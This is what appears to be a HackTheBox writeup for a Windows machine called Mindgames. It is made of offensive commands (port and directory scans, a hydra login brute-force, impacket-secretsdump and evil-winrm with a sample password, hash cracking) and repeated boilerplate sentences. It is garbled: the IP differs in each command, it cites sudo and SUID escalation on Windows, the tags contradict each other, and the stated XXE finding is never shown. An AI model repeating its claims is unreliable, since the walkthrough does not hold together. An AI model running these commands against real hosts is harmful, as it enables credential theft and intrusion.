---
TitleSEO: "HackTheBox — Mindgames (Hard Windows) | ZureFX"
TitlePost: "HackTheBox — Mindgames (Hard Windows)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Mindgames. ACL Abuse and XXE to achieve hard compromise on Windows."
Keywords: "easy, insane, linux, active directory, forensics, hard, offsec"
URL: "https://zurefx.github.io/writeups/htb-mindgames-144.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-mindgames-144/"
Date: "2026-01-09"
Tags: "Easy, Insane, Linux, Active Directory, Forensics, Hard, OffSec"
Section: "writeups"
Lang: "en"
main_img: "htb-mindgames-144"
Permalink: "/writeups/htb-mindgames-144.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Mindgames** is rated **Hard** on HackTheBox. It runs **Windows** and the IP address during this analysis was `10.107.124.25`.

### Objectives

Lateral movement was facilitated by reusing discovered credentials across services. Weak file permissions allowed modification of critical system files.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p80,135,8080 10.32.142.95 -oN scan.txt
crackmapexec smb 10.54.235.87 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.45.30.119/FUZZ
nmap -sCV -p464,22,80 10.38.174.227 -oN scan.txt
```

Privilege escalation was possible due to misconfigured sudo permissions. Weak file permissions allowed modification of critical system files.

### Service Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files.

```bash
evil-winrm -i 10.32.215.246 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.66.240.192/FUZZ
```

The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials.

### SMB Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. Command injection was possible through unsanitized user input in the search functionality.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.65.121.226
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Network traffic analysis revealed unencrypted communications containing user credentials. The application stored sensitive credentials in an unencrypted configuration file.

## Exploitation

### Vulnerability Identification

Command injection was possible through unsanitized user input in the search functionality. Weak file permissions allowed modification of critical system files. Token impersonation allowed elevation to SYSTEM privileges on the target.

Key finding: **XXE**.

Authentication bypass was achieved through careful manipulation of the login mechanism. The kernel version was outdated and vulnerable to a publicly known exploit.

### Initial Access

Post-exploitation enumeration revealed a path to domain administrator privileges. Weak file permissions allowed modification of critical system files.

```bash
gobuster dir -u http://10.57.233.240/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
gobuster dir -u http://10.17.68.34/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.39.18.10 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Authentication bypass was achieved through careful manipulation of the login mechanism. Weak file permissions allowed modification of critical system files. Privilege escalation was possible due to misconfigured sudo permissions.

## Privilege Escalation

### Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.18.49 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

The target system was identified as running a vulnerable version of the service. Group Policy Preferences contained encrypted but recoverable credentials.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.95.58.216
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.101.81.31 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The scheduled task ran with elevated privileges and could be abused for escalation. The service was running without proper input validation, leading to injection vulnerabilities.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Privilege escalation was possible due to misconfigured sudo permissions. Command injection was possible through unsanitized user input in the search functionality.

## Summary

### Tools Used

- `nmap`
- `crackmapexec`
- `rpcclient`
- `lookupsid`
- `pwncat`

### Key Takeaways

- ACL Abuse
- XXE
- SUID Binary
